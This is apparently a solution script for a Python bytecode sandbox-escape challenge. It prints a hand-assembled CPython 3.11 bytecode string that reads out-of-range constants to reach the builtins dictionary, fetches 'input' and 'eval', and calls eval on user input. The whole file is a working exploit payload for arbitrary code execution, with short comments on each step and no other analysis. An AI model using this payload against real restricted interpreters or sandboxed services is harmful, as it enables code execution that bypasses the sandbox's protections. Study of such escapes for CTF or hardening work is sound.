import dis

#get input function ontop of stack and call it, pushing result ontop of stack.
print(hex(dis.opmap['LOAD_CONST'])[2:]+"73", end="") 
print(hex(dis.opmap['UNPACK_EX'])[2:].rjust(2, "0")+"1d", end="") # get the string "input"
print(hex(dis.opmap['BUILD_MAP'])[2:].rjust(2, "0")+"0e", end="") 
print(hex(dis.opmap['POP_TOP'])[2:].rjust(2, "0")+"00", end="")
print(hex(dis.opmap['SWAP'])[2:]+"02", end="")
print(hex(dis.opmap['POP_TOP'])[2:].rjust(2, "0")+"00", end="") 
print(hex(dis.opmap['LOAD_CONST'])[2:]+"73", end="")
print(hex(dis.opmap['SWAP'])[2:]+"02", end="")
print(hex(dis.opmap['BINARY_SUBSCR'])[2:]+"00", end="") # get builtins['input']
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print("0"+hex(dis.opmap['PUSH_NULL'])[2:]+"00", end="")
print(hex(dis.opmap['SWAP'])[2:]+"02", end="")
print(hex(dis.opmap['PRECALL'])[2:]+"00", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['CALL'])[2:]+"00", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="") #need 4 caches of padding after a function call
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")

#get eval function ontop of stack and call it, with our input result as an argument.
print("0"+hex(dis.opmap['PUSH_NULL'])[2:]+"00", end="")
print(hex(dis.opmap['SWAP'])[2:]+"02", end="")
print(hex(dis.opmap['LOAD_CONST'])[2:]+"73", end="") 
print(hex(dis.opmap['UNPACK_EX'])[2:].rjust(2, "0")+"14", end="")
print(hex(dis.opmap['BUILD_MAP'])[2:].rjust(2, "0")+"09", end="") 
print(hex(dis.opmap['POP_TOP'])[2:].rjust(2, "0")+"00", end="")
print(hex(dis.opmap['POP_TOP'])[2:].rjust(2, "0")+"00", end="")
print(hex(dis.opmap['SWAP'])[2:]+"02", end="")
print(hex(dis.opmap['POP_TOP'])[2:].rjust(2, "0")+"00", end="")
print(hex(dis.opmap['LOAD_CONST'])[2:]+"73", end="")
print(hex(dis.opmap['SWAP'])[2:]+"02", end="")
print(hex(dis.opmap['BINARY_SUBSCR'])[2:]+"00", end="") 
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="") #must have padding after binary subscr
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['SWAP'])[2:]+"02", end="")
print(hex(dis.opmap['PRECALL'])[2:]+"00", end="")
print(hex(dis.opmap['CACHE'])[2:]+"000", end="")
print(hex(dis.opmap['CALL'])[2:]+"01", end="")
print()